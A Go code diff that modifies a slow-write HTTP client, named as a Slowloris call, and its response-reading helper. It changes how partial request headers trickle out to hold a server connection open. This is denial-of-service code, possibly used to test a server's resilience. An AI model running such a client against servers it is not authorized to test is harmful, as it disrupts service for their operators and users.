@@ -24,22 +24,21 @@ func oneSlowLorisCall(server string, port string) (err error) {
 
 	startRequest := "GET / HTTP/1.1\r\n" +
 		"Host: " + server + "\r\n" +
-		"Connection: close\r\n"
+		"X-Header: new\r\n"
 
 	if _, err = conn.Write([]byte(startRequest)); err != nil {
 		return fmt.Errorf("error writing to connection: %w", err)
 	}
 
-	userAgent := "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\r\n"
-
-	for _, b := range []byte(userAgent) {
-		if _, err := conn.Write([]byte{b}); err != nil {
+	for range 5 {
+		header := "UserAgent: this is random header\r\n"
+		if _, err := conn.Write([]byte(header)); err != nil {
 			return fmt.Errorf("error writing to connection: %w", err)
 		}
-		time.Sleep(1 * time.Millisecond)
+		time.Sleep(100 * time.Millisecond)
 	}
 
-	endHttp := "\r\n\r\n"
+	endHttp := "\r\n"
 	if _, err := conn.Write([]byte(endHttp)); err != nil {
 		return fmt.Errorf("error writing to connection: %w", err)
 	}
@@ -56,18 +55,21 @@ func oneSlowLorisCall(server string, port string) (err error) {
 // readResponse can be used to test the server response
 func readResponse(conn net.Conn) (string, error) {
 	buffer := make([]byte, 4096)
-	numberBytesRead := 0
+	rsp := ""
 	var err error
 	for {
+		numberBytesRead := 0
 		numberBytesRead, err = conn.Read(buffer)
+		fmt.Println(numberBytesRead)
 		if err == io.EOF {
 			break
 		}
 		if err != nil {
 			return "", fmt.Errorf("error reading from connection: %w", err)
 		}
+		rsp += string(buffer[:numberBytesRead])
 	}
-	return string(buffer[:numberBytesRead]), nil
+	return rsp, nil
 }
 
 func main() {
